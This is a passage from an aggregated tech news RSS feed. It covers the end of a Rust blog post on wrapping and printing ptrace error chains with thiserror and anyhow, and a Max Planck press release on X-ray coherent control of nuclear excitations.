  <li>Wrapping the <code>ptrace</code> error into an <code>CopyFromProcessError</code>, but that gives you nothing (except maybe some context, if you add some)</li>
  <li>With <code>InitError</code>s and <code>DumpingError</code>s that wrap the <code>ptrace</code> errors, you will still not know which section failed and why, but know if it was during <code>init()</code> or not.</li>
</ol>

<p>You might add context to option 2 as well (see below on how), but each section has a variety of reasons why it could fail. Some unique to the section, some shared among a few, some among all of them.</p>

<p>Complex problems sometimes require complex solutions, maybe?</p>

<h2 id="inc-err-ption">Inc <em>Err()</em> ption</h2>

<p>Using <code>thiserror</code> and the fabulous <code>#[from]</code> macro, you quickly define a plethora of errors and wrappers, starting from the deepest, darkest places in your callstack, wrapping your way up:</p>

<div><div><pre><code><span>#[derive(Debug,</span> <span>Error)]</span>
<span>pub</span> <span>enum</span> <span>PtraceDumperError</span> <span>{</span>
    <span>#[error(</span><span>"nix::ptrace() error"</span><span>)]</span>
    <span>PtraceError</span><span>(</span><span>#[from]</span> <span>nix</span><span>::</span><span>Error</span><span>),</span>
    <span>...</span>
<span>}</span>

<span>#[derive(Debug,</span> <span>Error)]</span>
<span>pub</span> <span>enum</span> <span>SectionAppMemoryError</span> <span>{</span>
    <span>#[error(</span><span>"Failed to copy memory from process"</span><span>)]</span>
    <span>CopyFromProcessError</span><span>(</span><span>#[from]</span> <span>PtraceDumperError</span><span>),</span>
    <span>...</span>
<span>}</span>

<span>#[derive(Debug,</span> <span>Error)]</span>
<span>pub</span> <span>enum</span> <span>DumpError</span> <span>{</span>
    <span>#[error(</span><span>"Error during init phase"</span><span>)]</span>
    <span>InitError</span><span>(</span><span>#[from]</span> <span>InitError</span><span>),</span>
    <span>#[error(transparent)]</span>
    <span>PtraceDumperError</span><span>(</span><span>#[from]</span> <span>PtraceDumperError</span><span>),</span>
    <span>#[error(</span><span>"Failed when writing section AppMemory"</span><span>)]</span>
    <span>SectionAppMemoryError</span><span>(</span><span>#[from]</span> <span>SectionAppMemoryError</span><span>),</span>
    <span>...</span>
</code></pre></div></div>

<p>The fun part is: You have to touch very little of your existing code, thanks to the automatic conversion from one error to the other, conveniently provided by <code>#[from]</code>:</p>
<div><div><pre><code><span>- pub fn init(&amp;mut self) -&gt; Result&lt;()&gt; {
</span><span>+ pub fn init(&amp;mut self) -&gt; Result&lt;(), InitError&gt; {
</span>     self.read_auxv()?;
     self.enumerate_threads()?;
     self.enumerate_mappings()?;
     Ok(())
 }
</code></pre></div></div>

<p>or</p>

<div><div><pre><code><span>- pub fn get_stack_info(&amp;self, int_stack_pointer: usize) -&gt; Result&lt;(usize, usize)&gt; {
</span><span>+ pub fn get_stack_info(&amp;self, int_stack_pointer: usize) -&gt; Result&lt;(usize, usize), DumperError&gt; {
</span> // snip

    let mapping = self
        .find_mapping(stack_pointer)
<span>-        .ok_or("No mapping for stack pointer found")?;
</span><span>+        .ok_or(DumperError::NoStackPointerMapping)?;
</span>    let offset = stack_pointer - mapping.start_address;
    let distance_to_end = mapping.size - offset;
  // snip
</code></pre></div></div>

<p>If you run your test binary again, you now get</p>
<div><div><pre><code>Failed when writing section AppMemory
</code></pre></div></div>
<p>which is√¢‚Ç¨¬¶.<em>(Throws a stack of papers from the desk)</em>√¢‚Ç¨¬¶short. Too short, and not that much more helpful, actually. Well, you know which section is failing. Thats good. But where are all the nice error messages you specified in your errors?</p>

<p>Hm, you do only use <code>println!("{}", error);</code>. Maybe <code>{:?}</code> is better?</p>
<div><div><pre><code>SectionAppMemoryError(CopyFromProcessError(PtraceError(Sys(EIO))))
</code></pre></div></div>

<p>Aha! Now you are getting somewhere! Tiny, tiny, painfully <strong>tiny</strong> steps, but you are getting somewhere! No error texts, but at least a chain!</p>

<p>Normal printing doesn√¢‚Ç¨‚Ñ¢t seem to recursively go through all the wrapped errors, but stop at the top most. For this, you need to either go through all the errors yourself by hand, or use a crate that does this for you. There are a number of them that provide this, but <code>anyhow</code> will do (its by the same author as <code>thiserror</code>, so interoperability shouldn√¢‚Ç¨‚Ñ¢t be an issue).</p>

<div><div><pre><code>    <span>println!</span><span>(</span><span>"{:#}"</span><span>,</span> <span>anyhow</span><span>::</span><span>Error</span><span>::</span><span>new</span><span>(</span><span>error</span><span>));</span>
</code></pre></div></div>

<p>aaaaand:</p>

<div><div><pre><code>Failed when writing section AppMemory: Failed to copy memory from process: nix::ptrace() error: EIO: I/O error
</code></pre></div></div>

<p><em>Collects papers from the ‚Ä¶</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://msirringhaus.github.io/Where-everything-went-wrong/">https://msirringhaus.github.io/Where-everything-went-wrong/</a></em></p>]]>
            </description>
            <link>https://msirringhaus.github.io/Where-everything-went-wrong/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191006</guid>
            <pubDate>Fri, 19 Feb 2021 08:57:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Coherent Nuclear Excitations]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190965">thread link</a>) | @_Microft
<br/>
February 19, 2021 | https://www.mpg.de/16449701/coherent-nuclear-excitations | <a href="https://web.archive.org/web/*/https://www.mpg.de/16449701/coherent-nuclear-excitations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  
  
  <p>The extremely precise control of nuclear excitations opens up possibilities of ultra-precise atomic clocks and powerful nuclear batteries</p>
  

  

  <p>From atomic clocks to secure communication to quantum computers: these developments are based on the increasingly better control of the quantum behaviour of electrons in atomic shells with the help of laser light. Now, for the first time, physicists at the Max Planck Institute for Nuclear Physics in Heidelberg have succeeded in precisely controlling quantum jumps in atomic nuclei using X-ray light. Compared with electron systems, nuclear quantum jumps are extreme ‚Äì with energies up to millions of times higher and incredibly short zeptosecond processes. A zeptosecond is one trillionth of a billionth of a second. The rewards include profound insight into the quantum world, ultra-precise nuclear clocks, and nuclear batteries with enormous storage capacity. The experiment required a sophisticated X-ray flash facility developed by a Heidelberg group led by J√∂rg Evers as part of an international collaboration.</p>
  
  
<figure data-description="Loss or gain for nuclear excitations: A team from the Max Planck Institute in Heidelberg excites nuclei of iron atoms with a flash of X-ray light and then sends a second such flash onto the sample with different delays and detuning. Then, over a period of about 200 nanoseconds, the researchers measure the intensity of the light with which the nuclei release the absorbed energy (light yellow: high intensity; violet: low intensity). They can choose the delay so that the second flash reduces the excitation and the nuclei release their energy quickly and with high intensity (a). After only 50 nanoseconds, the emission has decreased significantly. In contrast, they still emit a relatively large amount of light after more than 100 nanoseconds if the second pulse amplifies the excitation from the first (b)." data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hOalEwT1RneE9IMCUzRC0tZTM2MTdkM2NiYzMwZTYzOGJkYjdmYzNmODUyOTg2YjZlMmQ2NzAyNSIgZGF0YS1hbHQ9Im9yaWdpbmFsIiBkYXRhLWNsYXNzPSIiPjxzb3VyY2UgbWVkaWE9IihtYXgtd2lkdGg6IDc2N3B4KSIgc3Jjc2V0PSIvMTY0NDk4MTgvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZOREUwTENKdlltcGZhV1FpT2pFMk5EUTVPREU0ZlElM0QlM0QtLTYzM2Q1Mjk2ZTkxMGMwZmZmODJkYWQ3MTk3YWE1ZTg1ZGE1OTYwZGYgNDE0dywgLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpjMUxDSnZZbXBmYVdRaU9qRTJORFE1T0RFNGZRJTNEJTNELS05Y2VkYzU4ZDllZDViNGM3ODI4ZDk3MDFmOTgzMTAxYWRkYmEzYjcwIDM3NXcsIC8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk16SXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ERTRmUSUzRCUzRC0tY2QzMjMyYmNjMmY5ZTU4OWQ3YzFiNmYxM2I2ZTBiYWRkMTEzMjJlZiAzMjB3LCAvMTY0NDk4MTgvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZOREV4TENKdlltcGZhV1FpT2pFMk5EUTVPREU0ZlElM0QlM0QtLWEzMGUxMjcxOGViNDVhNjQ4NTg5OGMyY2JiNmNiNGYzYzYzYTA5Y2MgNDExdywgLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TkRnd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RFNGZRJTNEJTNELS05OGYwYzUzMWMxMDc2NWU4YTUwYzlmMjcwNjc1MjEwNDE3MmNkZWIxIDQ4MHcsIC8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk16WXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ERTRmUSUzRCUzRC0tNjViYzk1YmQ5ODZiZDdiY2NlYTdiMzBiY2FiYmM4Zjg1OTFiMTNjYiAzNjB3LCAvMTY0NDk4MTgvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZPREk0TENKdlltcGZhV1FpT2pFMk5EUTVPREU0ZlElM0QlM0QtLTI2NmNjODYxYjJkNjc0YmZmZjE0NTA4ZDY4M2MyZjdmZWZlZTkxYTQgODI4dywgLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TnpVd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RFNGZRJTNEJTNELS05OGJiMTZmNjMyMzZjYWUzMWE4OTVhMWI0OTNmYjBmYmMxNzcwNTM1IDc1MHcsIC8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk5qUXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ERTRmUSUzRCUzRC0tYWRjYmQxMjVjNzI4ZGNjZWJiZWNkMWM5ODcxOWQyNWExNTExZDU0ZCA2NDB3LCAvMTY0NDk4MTgvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZPREl5TENKdlltcGZhV1FpT2pFMk5EUTVPREU0ZlElM0QlM0QtLThiZjAxMTE3MjVkNWZlNjNjYTc5M2QwNWQ4MGQ0YWUwYWY1NThiODIgODIydywgLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2T1RZd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RFNGZRJTNEJTNELS1iMDNmOTZjMDdjYjU2MzJmOWIxYjgzMGY0ZjUyMTZhMTIzNzNhOGYyIDk2MHcsIC8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk56SXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ERTRmUSUzRCUzRC0tNWI5OTZkYTY4MWQwYjAzMWY2OTA4OGQzZjhmNzUzOWE2NzE2ZWY5NyA3MjB3IiBzaXplcz0iMTAwdnciIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogNzY4cHgpIGFuZCAobWF4LXdpZHRoOiA5OTFweCkiIHNyY3NldD0iLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2T1RBd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RFNGZRJTNEJTNELS1lODU1MWYzNGJhYzk4NmM2YTg3YzVkYjIzYjE1ZDRhN2JkMjNkZDBlIDkwMHcsIC8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1UZ3dNQ3dpYjJKcVgybGtJam94TmpRME9UZ3hPSDAlM0QtLTNmZmZlMzJiYzMxMDNlMmFmNzk1N2UzZjFkMmYxYmUyYTcyZWY3OWEgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRJd01Dd2liMkpxWDJsa0lqb3hOalEwT1RneE9IMCUzRC0tZDA1ODNiYzg0ODU3OWI3MzI0YTdlODA0MDVkZGZhMzQ5YTdmZWFmNCAxMjAwdywgLzE2NDQ5ODE4L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TWpRd01Dd2liMkpxWDJsa0lqb3hOalEwT1RneE9IMCUzRC0tMGZkN2FjMDQ5NTI5YTM3YzViZWU3Nzg1YTMzMWZhMDgyZmVmZTRiMiAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1UUXdNQ3dpYjJKcVgybGtJam94TmpRME9UZ3hPSDAlM0QtLWUzNjE3ZDNjYmMzMGU2MzhiZGI3ZmMzZjg1Mjk4NmI2ZTJkNjcwMjUgMTQwMHcsIC8xNjQ0OTgxOC9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1qZ3dNQ3dpYjJKcVgybGtJam94TmpRME9UZ3hPSDAlM0QtLTYxMDQ0NzQzNDViYWIwZGZjZDBkYWRjNDhhZWQ3NjdlZGFmYzI4Y2QgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iTG9zcyBvciBnYWluIGZvciBudWNsZWFyIGV4Y2l0YXRpb25zOiBBIHRlYW0gZnJvbSB0aGUgTWF4IFBsYW5jayBJbnN0aXR1dGUgaW4gSGVpZGVsYmVyZyBleGNpdGVzIG51Y2xlaSBvZiBpcm9uIGF0b21zIHdpdGggYSBmbGFzaCBvZiBYLXJheSBsaWdodCBhbmQgdGhlbiBzZW5kcyBhIHNlY29uZCBzdWNoIGZsYXNoIG9udG8gdGhlIHNhbXBsZSB3aXRoIGRpZmZlcmVudCBkZWxheXMgYW5kIGRldHVuaW5nLiBUaGVuLCBvdmVyIGEgcGVyaW9kIG9mIGFib3V0IDIwMCBuYW5vc2Vjb25kcywgdGhlIHJlc2VhcmNoZXJzIG1lYXN1cmUgdGhlIGludGVuc2l0eSBvZiB0aGUgbGlnaHQgd2l0aCB3aGljaCB0aGUgbnVjbGVpIHJlbGVhc2UgdGhlIGFic29yYmVkIGVuZXJneSAobGlnaHQgeWVsbG93OiBoaWdoIGludGVuc2l0eTsgdmlvbGV0OiBsb3cgaW50ZW5zaXR5KS4gVGhleSBjYW4gY2hvb3NlIHRoZSBkZWxheSBzbyB0aGF0IHRoZSBzZWNvbmQgZmxhc2ggcmVkdWNlcyB0aGUgZXhjaXRhdGlvbiBhbmQgdGhlIG51Y2xlaSByZWxlYXNlIHRoZWlyIGVuZXJneSBxdWlja2x5IGFuZCB3aXRoIGhpZ2ggaW50ZW5zaXR5IChhKS4gQWZ0ZXIgb25seSA1MCBuYW5vc2Vjb25kcywgdGhlIGVtaXNzaW9uIGhhcyBkZWNyZWFzZWQgc2lnbmlmaWNhbnRseS4gSW4gY29udHJhc3QsIHRoZXkgc3RpbGwgZW1pdCBhIHJlbGF0aXZlbHkgbGFyZ2UgYW1vdW50IG9mIGxpZ2h0IGFmdGVyIG1vcmUgdGhhbiAxMDAgbmFub3NlY29uZHMgaWYgdGhlIHNlY29uZCBwdWxzZSBhbXBsaWZpZXMgdGhlIGV4Y2l0YXRpb24gZnJvbSB0aGUgZmlyc3QgKGIpLiIgc3JjPSIvMTY0NDk4MTgvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE5qUTBPVGd4T0gwJTNELS1lMzYxN2QzY2JjMzBlNjM4YmRiN2ZjM2Y4NTI5ODZiNmUyZDY3MDI1IiAvPjwvcGljdHVyZT4=">
      
      

    
    <figcaption>
        <p>
          Loss or gain for nuclear excitations: A team from the Max Planck Institute in Heidelberg excites nuclei of iron atoms with a flash of X-ray light and then sends a second such flash onto the sample with different delays and detuning. Then, over a period of about 200 nanoseconds, the researchers measure the intensity of the light with which the nuclei release the absorbed energy (light yellow: high intensity; violet: low intensity). They can choose the delay so that the second flash reduces the excitation and the nuclei release their energy quickly and with high intensity (a). After only 50 nanoseconds, the emission has decreased significantly. In contrast, they still emit a relatively large amount of light after more than 100 nanoseconds if the second pulse amplifies the excitation from the first (b).
        </p>
        <p>
          ¬© MPI for Nuclear Physics
        </p>
    </figcaption>
</figure>


<p>One of the great successes of modern physics is the increasingly precise control of dynamic quantum processes. It enables a deeper understanding of the quantum world with all its oddities and is also a driving force of new quantum technologies. But from the perspective of the atoms, ‚Äúcoherent control‚Äù has so far remained superficial: it is the quantum jump of the electrons in the outer shell of the atoms that has become increasingly controllable by lasers. But as Christoph Keitel explains, the atomic nuclei themselves are also quantum systems in which the nuclear building blocks can make quantum jumps between different quantum states.</p>
<h2>Energy-rich quantum jumps for nuclear batteries</h2>
<p>‚ÄúIn addition to this analogy to electron shells, there are huge differences‚Äù, explains the Director at the Max Planck Institute for Nuclear Physics in Heidelberg: ‚ÄúThey‚Äôve got us so excited!‚Äù Quantum jumps between different quantum states are actually jumps on a kind of energy ladder. ‚ÄúAnd the energies of these quantum jumps are often six orders of magnitude greater than in the electron shell‚Äù, says Keitel. A single quantum jump made by a nuclear component can thus pump up to a million times more energy into it ‚Äì or get it out again. This has given rise to the idea of nuclear batteries with an unprecedented storage capacity.</p>
<p>Such technical applications are still visions of the future. At the moment, research entails addressing and controlling these quantum jumps in a targeted manner. This requires precisely controlled, high-energy X-ray light. The Heidelberg team has been working on such an experimental technique for over 10 years. It has now been used for the first time.</p>
<h2>Accurate frequencies enable ultra-precise atomic clocks</h2>
<p>The quantum states of atomic nuclei offer another important advantage over electron states. Compared with the electronic quantum jumps, they are much more sharply defined. Because this translates directly into more accurate frequencies according to the laws of physics, they can, in principle, be used for extremely precise measurements. For example, this could enable the development of ultra-precise nuclear clocks that would make today‚Äôs atomic clocks look like antiquated pendulum clocks. In addition to technical applications of such clocks (e.g. in navigation), they could be used to examine the fundamentals of today‚Äôs physics much more precisely. This includes the fundamental question of whether the constants of nature really are constant. However, such precision techniques require the control of quantum transitions in the nuclei.</p>

<figure data-description="Scheme of the experiment. The first sample generates a double pulse from the synchrotron pulse. By moving the sample, the second pulse is delayed with respect to the first. The first pulse then excites atomic nuclei of the second sample. The strength of the excitation can be controlled by delaying the second pulse." data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hOalEwT1Rnek1uMCUzRC0tMTczMmYwZWQwZGYwNDczZmJjMzQ2OWMxYjEzNTZjYjQ4Y2VhNzNiOCIgZGF0YS1hbHQ9Im9yaWdpbmFsIiBkYXRhLWNsYXNzPSIiPjxzb3VyY2UgbWVkaWE9IihtYXgtd2lkdGg6IDc2N3B4KSIgc3Jjc2V0PSIvMTY0NDk4MzIvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZOREUwTENKdlltcGZhV1FpT2pFMk5EUTVPRE15ZlElM0QlM0QtLTQzYzBlOTU5ODgwODNiZTM0MWZiZTc4Zjc5NDA2ZDNiMmNkNTI2MmEgNDE0dywgLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpjMUxDSnZZbXBmYVdRaU9qRTJORFE1T0RNeWZRJTNEJTNELS1jZjg3YjE2NzhkMWJmODdkNzljN2JkNTk5NTFhM2E0ZjhjOTAwOWQyIDM3NXcsIC8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk16SXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ETXlmUSUzRCUzRC0tODNhOWU0OTU1MGU0YzYyNjU2ZmM2NjVkMGZjNmE4ODdkNDU3MjljZSAzMjB3LCAvMTY0NDk4MzIvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZOREV4TENKdlltcGZhV1FpT2pFMk5EUTVPRE15ZlElM0QlM0QtLTk1MDBkMTc0YzBjM2I1ZGEwNWU0YjExZmFiOGRhMWY2OWRlYjBkNmMgNDExdywgLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TkRnd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RNeWZRJTNEJTNELS1jMmRhMzY0MGQwN2RmNjZjZDc3MTY4MzNmZjkzMWYxMzlhZGY3YWRjIDQ4MHcsIC8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk16WXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ETXlmUSUzRCUzRC0tYTA3Yzc5YjkwZjg4YWJhNzZlYTRkMjI0MDhiODU4NjVhYzk5YTkzYyAzNjB3LCAvMTY0NDk4MzIvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZPREk0TENKdlltcGZhV1FpT2pFMk5EUTVPRE15ZlElM0QlM0QtLWVmNWE0ZWE4MzA5YTczOTNmZmFmY2UzMjQzMTdjMGM2OGIxNTcwODQgODI4dywgLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TnpVd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RNeWZRJTNEJTNELS0wM2I5MGJkYmJkMzNhZGE5MDc2ZjAzOWVlZTlkYzkzMTJmYjdmNTc1IDc1MHcsIC8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk5qUXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ETXlmUSUzRCUzRC0tYWY4ZTJhNzUyMjZiOGVhODM5MDlkMTI1MDNiZTkyZTI4OWEwYjQ3NyA2NDB3LCAvMTY0NDk4MzIvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZPREl5TENKdlltcGZhV1FpT2pFMk5EUTVPRE15ZlElM0QlM0QtLWVmYjM4ZTFiMDk5NmQ1NWY5ZGZlODJmNmJhNmIxODU3YjdjYjc4ZWMgODIydywgLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2T1RZd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RNeWZRJTNEJTNELS0xMzk5NWNmZjNlN2I2MTM5OGJhY2I4ODgyYzQ0NWYwZmY4NWE1NDVlIDk2MHcsIC8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk56SXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9ETXlmUSUzRCUzRC0tNWU1NTQ5N2ZjZmFkNGIyYmE0MGUwOTczYmUwNmRmMmVjM2U5ZDVjYSA3MjB3IiBzaXplcz0iMTAwdnciIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogNzY4cHgpIGFuZCAobWF4LXdpZHRoOiA5OTFweCkiIHNyY3NldD0iLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2T1RBd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RNeWZRJTNEJTNELS01YzYxYzg4Y2ZkMDQzYThmZGZlYjYxYWE1MTE3OTQ0MjQxZTFkZGMzIDkwMHcsIC8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1UZ3dNQ3dpYjJKcVgybGtJam94TmpRME9UZ3pNbjAlM0QtLTlhOWI5MzZhZTIyNDcwYmJjYWU2N2ZiZTVmYjlmYjdkZTUzODhkMzcgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRJd01Dd2liMkpxWDJsa0lqb3hOalEwT1Rnek1uMCUzRC0tMjVkY2JkYWMyMDI3YzI1OTUyNDNkOGQ5ZmI3Nzk5OWFjZGQzNzlmZiAxMjAwdywgLzE2NDQ5ODMyL29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TWpRd01Dd2liMkpxWDJsa0lqb3hOalEwT1Rnek1uMCUzRC0tNWE5MWJiMWMxNTFmZDliY2ZmZTA5MzAxNjkwYjhiNWVkODY4NzUxZiAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1UUXdNQ3dpYjJKcVgybGtJam94TmpRME9UZ3pNbjAlM0QtLTE3MzJmMGVkMGRmMDQ3M2ZiYzM0NjljMWIxMzU2Y2I0OGNlYTczYjggMTQwMHcsIC8xNjQ0OTgzMi9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1qZ3dNQ3dpYjJKcVgybGtJam94TmpRME9UZ3pNbjAlM0QtLWFiNzZkNTFkYmMwN2MxNGI4ODAzNmJjYjE1ZTY3NzBmOGE1ZGJhMmMgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iU2NoZW1lIG9mIHRoZSBleHBlcmltZW50LiBUaGUgZmlyc3Qgc2FtcGxlIGdlbmVyYXRlcyBhIGRvdWJsZSBwdWxzZSBmcm9tIHRoZSBzeW5jaHJvdHJvbiBwdWxzZS4gQnkgbW92aW5nIHRoZSBzYW1wbGUsIHRoZSBzZWNvbmQgcHVsc2UgaXMgZGVsYXllZCB3aXRoIHJlc3BlY3QgdG8gdGhlIGZpcnN0LiBUaGUgZmlyc3QgcHVsc2UgdGhlbiBleGNpdGVzIGF0b21pYyBudWNsZWkgb2YgdGhlIHNlY29uZCBzYW1wbGUuIFRoZSBzdHJlbmd0aCBvZiB0aGUgZXhjaXRhdGlvbiBjYW4gYmUgY29udHJvbGxlZCBieSBkZWxheWluZyB0aGUgc2Vjb25kIHB1bHNlLiIgc3JjPSIvMTY0NDk4MzIvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE5qUTBPVGd6TW4wJTNELS0xNzMyZjBlZDBkZjA0NzNmYmMzNDY5YzFiMTM1NmNiNDhjZWE3M2I4IiAvPjwvcGljdHVyZT4=">
      
      

    
    <figcaption>
        <p>
          Scheme of the experiment. The first sample generates a double pulse from the synchrotron pulse. By moving the sample, the second pulse is delayed with respect to the first. The first pulse then excites atomic nuclei of the second sample. The strength of the excitation can be controlled by delaying the second pulse.
        </p>
        <p>
          ¬© MPI for Nuclear Physics
        </p>
    </figcaption>
</figure>


<h2>Coordinated light flashes enhance or reduce the excitation</h2>
<p>The principle of the Heidelberg experimental technique sounds quite simple at first. It uses pulses (i.e. flashes) of high-energy X-ray light, which are currently provided by the European Synchrotron Radiation Source ESRF in Grenoble. The experiment splits these X-ray pulses in a first sample in such a way that a second &nbsp;pulse follows behind the rest of the first pulse with a time delay. One after the other, both encounter a second sample, the actual object of investigation.</p>
<p>The first pulse is very brief and contains a broad mix of frequencies. Like a shotgun blast, it stimulates a quantum jump in the nuclei; in the first experiment, this was a special quantum state in &nbsp;nuclei of &nbsp;iron atoms. The second pulse is much longer and has an energy that is precisely tuned to the quantum jump. In this way, it can specifically manipulate the quantum dynamics triggered by Pulse 1. The time span between the two pulses can be adjusted. This allows the team to adjust whether the second pulse is more constructive or destructive for the quantum state.</p>
<p>The Heidelberg physicists compare this control mechanism to a swing. With the first pulse, you push it. Depending on the phase of its oscillation in which you give it a second push, it oscillates even stronger or is slowed down.</p>
<h2>Pulse control accurate to a few zeptoseconds</h2>
<p>But what sounds simple is a technical challenge that required years of research. A controlled change in the quantum dynamics of an atomic nucleus requires that the delay of the second pulse is stable on the unimaginably short time scale of a few zeptoseconds. Because only then do the two pulses work together in a controlling way.</p>
